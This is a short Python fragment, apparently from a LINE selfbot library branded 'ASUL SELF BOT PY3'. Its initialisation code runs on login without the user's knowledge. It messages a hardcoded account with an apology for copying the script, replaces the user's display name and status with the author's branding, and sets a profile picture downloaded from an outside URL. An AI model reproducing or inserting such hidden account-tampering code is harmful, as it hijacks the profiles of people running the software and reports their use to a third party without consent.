...
class Object(object):
    ...
    def __init__(self):
        if self.isLogin == True:
            ...
            ridenx = "u5d777f646c37180c939be97aa5097096"
            xmod = self.getContact(ridenx).displayName
            self.sendText("u5d777f646c37180c939be97aa5097096", 'ขอโทษนะ %s , ผมก๊อพสคิปมาใช้' % xmod)
            profile = self.getProfile()
            profile.displayName = "ASUL SELF BOT PY3"
            self.updateProfile(profile)
            profile.statusMessage = "ใส่เชลASULแล้วก็ให้เครดิตกันด้วยนะ ASUL BOT BY ตูน= ┅═हवさູ১さั৩ழণ১ह═┅"
            self.updateProfile(profile)
            DOMAIN_ = "http://upload.siamza.com/file_upload/modify/310818/33508.png"
            LINE = self.downloadFileURL(DOMAIN_)
            self.updateProfilePicture(LINE)
            GEN = "u5d777f646c37180c939be97aa5097096"
